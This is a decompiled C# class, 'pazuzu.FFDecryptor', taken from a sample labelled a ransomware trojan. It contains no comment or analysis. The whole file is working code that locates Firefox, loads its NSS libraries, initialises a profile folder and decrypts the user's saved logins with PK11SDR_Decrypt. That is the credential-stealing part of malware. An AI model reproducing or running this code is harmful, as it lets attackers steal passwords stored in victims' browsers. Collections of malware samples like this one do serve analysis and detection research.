// Decompiled with JetBrains decompiler
// Type: pazuzu.FFDecryptor
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace pazuzu
{
  internal static class FFDecryptor
  {
    private static IntPtr NSS3;
    private const string ffFolderName = "\\Mozilla Firefox\\";

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllFilePath);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    public static long NSS_Init(string configdir)
    {
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Mozilla Firefox\\";
      if (!Directory.Exists(path))
        path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
      if (!Directory.Exists(path))
        throw new Exception("Firefox folder not found");
      FFDecryptor.LoadLibrary(path + "mozglue.dll");
      FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(path + "nss3.dll");
      return ((FFDecryptor.DLLFunctionDelegate) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (NSS_Init)), typeof (FFDecryptor.DLLFunctionDelegate)))(configdir);
    }

    public static string Decrypt(string cypherText)
    {
      IntPtr num = IntPtr.Zero;
      StringBuilder stringBuilder = new StringBuilder(cypherText);
      try
      {
        byte[] source = Convert.FromBase64String(cypherText);
        num = Marshal.AllocHGlobal(source.Length);
        Marshal.Copy(source, 0, num, source.Length);
        FFDecryptor.TSECItem result = new FFDecryptor.TSECItem();
        if (FFDecryptor.PK11SDR_Decrypt(ref new FFDecryptor.TSECItem()
        {
          SECItemType = 0,
          SECItemData = num,
          SECItemLen = source.Length
        }, ref result, 0) == 0)
        {
          if (result.SECItemLen != 0)
          {
            byte[] numArray = new byte[result.SECItemLen];
            Marshal.Copy(result.SECItemData, numArray, 0, result.SECItemLen);
            return Encoding.ASCII.GetString(numArray);
          }
        }
      }
      catch (Exception ex)
      {
        string message = ex.Message;
        return (string) null;
      }
      finally
      {
        if (num != IntPtr.Zero)
          Marshal.FreeHGlobal(num);
      }
      return (string) null;
    }

    public static int PK11SDR_Decrypt(
      ref FFDecryptor.TSECItem data,
      ref FFDecryptor.TSECItem result,
      int cx)
    {
      return ((FFDecryptor.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, nameof (PK11SDR_Decrypt)), typeof (FFDecryptor.DLLFunctionDelegate5)))(ref data, ref result, cx);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(
      ref FFDecryptor.TSECItem data,
      ref FFDecryptor.TSECItem result,
      int cx);

    public struct TSECItem
    {
      public int SECItemType;
      public IntPtr SECItemData;
      public int SECItemLen;
    }
  }
}
